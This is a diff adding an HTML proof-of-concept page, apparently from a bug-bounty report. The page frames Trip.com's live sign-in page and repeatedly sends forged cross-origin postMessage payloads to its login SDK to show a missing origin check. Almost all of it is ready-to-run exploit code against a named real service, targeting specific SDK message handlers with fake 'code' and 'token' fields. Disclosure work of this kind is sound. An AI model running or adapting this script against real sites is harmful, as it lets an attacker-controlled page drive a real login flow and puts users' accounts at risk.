@@ -1,0 +1,57 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Trip cross-origin postMessage no-origin-check PoC</title></head>
+<body style="font-family:system-ui;max-width:720px;margin:32px auto;line-height:1.5">
+<h2>Trip.com login SDK — cross-origin postMessage / missing origin validation PoC</h2>
+<p>Authorized bug-bounty test — HackerOne <b>sshabib</b>. This page is a DIFFERENT origin from www.trip.com.
+It embeds Trip's login in an iframe and postMessages a forged, benign message into it. If Trip's SDK acts on
+our message, its <code>event.origin</code> check is missing (CWE-346) — an attacker origin can drive the login SDK.</p>
+
+<ol>
+  <li>Click <b>Load Trip login</b> (embeds www.trip.com/account/signin — allowed, no X-Frame-Options/CSP).</li>
+  <li>In the iframe, click a <b>social-login button (Google)</b> so the SDK arms its message listener.</li>
+  <li>Click <b>Fire forged cross-origin message</b> (also auto-sprays). It posts from THIS origin into the Trip iframe.</li>
+  <li><b>Proof signal:</b> in DevTools Console (this page), a COOP warning / SDK activity attributed to the Trip
+      bundle when our message is delivered = the handler ran on our cross-origin message. Screenshot the Console +
+      the iframe for the report.</li>
+</ol>
+
+<button id="load" style="padding:10px 16px;font-size:16px">Load Trip login</button>
+<button id="fire" style="padding:10px 16px;font-size:16px" disabled>Fire forged cross-origin message</button>
+<pre id="log" style="background:#111;color:#0f0;padding:12px;margin-top:12px;white-space:pre-wrap"></pre>
+
+<iframe id="f" style="width:100%;height:520px;border:2px solid #888;margin-top:12px" title="trip login"></iframe>
+
+<script>
+const MARKER = 'XORIGIN_POC_MARKER_NOT_A_REAL_CODE';
+const log = m => document.getElementById('log').textContent += m + '\n';
+let sprayer = null;
+
+document.getElementById('load').onclick = () => {
+  document.getElementById('f').src = 'https://www.trip.com/account/signin';
+  document.getElementById('fire').disabled = false;
+  log('[+] Trip login embedded (cross-origin iframe). No X-Frame-Options / CSP frame-ancestors on that page => framing allowed.');
+  log('[+] Now click a social-login (Google) button INSIDE the iframe to arm the SDK, then Fire.');
+};
+
+function shoot() {
+  const w = document.getElementById('f').contentWindow;
+  if (!w) return false;
+  // popup-provider path (bindPostMsgFun): gate = tpSignalCode, reads .code
+  w.postMessage({ tpSignalCode:'TRIP',  code:MARKER, type:'google' }, '*');
+  w.postMessage({ tpSignalCode:'CTRIP', code:MARKER, type:'google' }, '*');
+  // middle-page path (receiveMiddlPageMessage): reads code/message/context/token
+  w.postMessage({ code:MARKER, message:'ok', context:'{}', token:MARKER, taskType:1 }, '*');
+  return true;
+}
+
+document.getElementById('fire').onclick = () => {
+  if (sprayer) clearInterval(sprayer);
+  let n = 0;
+  log('[*] spraying forged cross-origin messages into the Trip iframe every 300ms for 60s...');
+  log('    watch THIS page Console for Trip-bundle activity (COOP/window.close warning) attributed to our postMessage = handler ran cross-origin.');
+  sprayer = setInterval(() => { if (!shoot() || ++n > 200) { clearInterval(sprayer); log('[*] spray done'); } }, 300);
+};
+</script>
+</body>
+</html>
